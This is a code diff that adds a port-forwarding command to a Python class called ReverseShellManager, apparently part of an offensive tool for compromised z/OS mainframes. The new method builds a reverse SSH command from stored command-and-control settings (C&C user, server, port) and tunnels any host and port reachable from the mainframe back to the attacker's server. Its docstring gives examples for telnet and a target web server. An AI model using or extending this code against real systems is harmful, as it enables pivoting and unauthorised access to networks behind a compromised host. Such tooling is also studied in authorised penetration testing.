@@ -24,6 +24,35 @@ class ReverseShellManager(WrappingShell):
         if config is not None:
             self.status_config = config['ZOS']
 
+    def do__forward(self, args):
+        """Forward any ip:port from the mainframe to a port on localhost
+
+EXAMPLES:
+    Forward port 23 on the mainframe to port 2323 on the cc server
+    > _forward 127.0.0.1:23 2323
+
+    Forward a web server as seen by the mainframe to port 8080 on the cc server
+    > _forward www.target.server:80 8080"""
+        try:
+            target = args.split()[0]
+            localport = args.split()[1]
+            config = self.status_config
+            ssh_step = Template(self.REVERSE_SH_SSH).substitute(
+                KEYNAME=config['ftpkeyname'],
+                KNOWNHOSTSFILE=config['ftpknownhosts'],
+                CCU=config['cc_user'],
+                CCS=config['cc_server'],
+                CCP=config['cc_port'],
+                NCIP=config['ebcdiccat_host'],
+                NCP=config['ebcdiccat_port']
+                )
+            run_ssh_command = ssh_step + " -R " + localport + ":" + target + '&'
+            self.default(run_ssh_command)
+        except AttributeError as e:
+            logging.error("No reverse SSH shell config found.")
+            logging.error("Running in detached mode?")
+
+
     def do__runssh(self, args):
         """Add the command line arguments to a non interactive background ssh
 reverse connection.
